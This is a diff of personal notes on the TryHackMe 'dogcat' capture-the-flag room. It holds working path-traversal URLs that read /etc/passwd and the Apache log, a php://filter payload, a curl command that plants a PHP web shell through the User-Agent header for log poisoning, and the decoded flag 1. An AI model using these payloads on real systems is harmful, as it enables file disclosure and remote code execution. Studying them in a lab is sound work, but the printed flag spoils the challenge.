@@ -161,11 +161,34 @@ https://apt2002.medium.com/tryhackme-dogcat-ctf-detailed-walkthrough-cd746fd232e
 https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=355
  
 passward file 
-http://10.10.15.63/?view=dog/../../../../../../etc/passwd&ext=
-http://10.10.15.63/?view=dog/../../../../../../etc/pam.conf&ext=
+http://IP/?view=dog/../../../../../../etc/passwd&ext=
+http://IP/?view=dog/../../../../../../etc/pam.conf&ext=
 access.log file
-http://10.10.15.63/?view=dog/../../../../../..//var/log/apache2/access.log&ext=
+http://10.10.15.63/?view=dog/../../../../../../var/log/apache2/access.log&ext=
+http://10.82.177.61/?view=dog/../../../../../../var/log/apache2/access.log&ext&c=id
+flag file
+?view=php://filter/read=convert.base64-encode/resource=dog/../flag
+
+
+ To Download the main page run :
+ curl "IP" -H  "User-Agent: <?php system(\$_GET['c']);?>"
+
+
+https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=639
+
+
 
 
 1. What is flag 1?
-Hint: There's more to *view* than just cats and dogs... 
+ 
+run :
+
+echo  PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo | base64 -d
+
+output: <?php
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+
+https://fnginfosec.github.io/tryhackme/2020/07/22/dogcat.html
+
+
+ 
